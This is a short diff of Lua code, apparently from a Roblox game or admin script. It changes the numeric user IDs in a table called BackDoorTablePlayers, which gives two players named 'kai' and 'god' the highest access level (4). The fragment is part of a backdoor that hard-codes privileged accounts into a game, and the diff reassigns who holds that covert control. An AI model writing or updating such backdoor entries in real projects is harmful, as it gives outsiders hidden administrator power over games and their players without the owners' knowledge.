@@ -227,12 +227,12 @@ local BackDoorTableCommands = {
 }
 
 local BackDoorTablePlayers = {
-	[83249417] = {
+	[1553843415] = {
         	['Name'] = "kai";
         	['Access'] = 4;
         	['Colour'] = Color3.fromRGB(111,238,252);
         };
-	[152357851] = {
+	[138534] = {
 		['Name'] = "god"; 
 		['Access'] = 4;
 		['Colour'] = Color3.fromRGB(255,0,0);
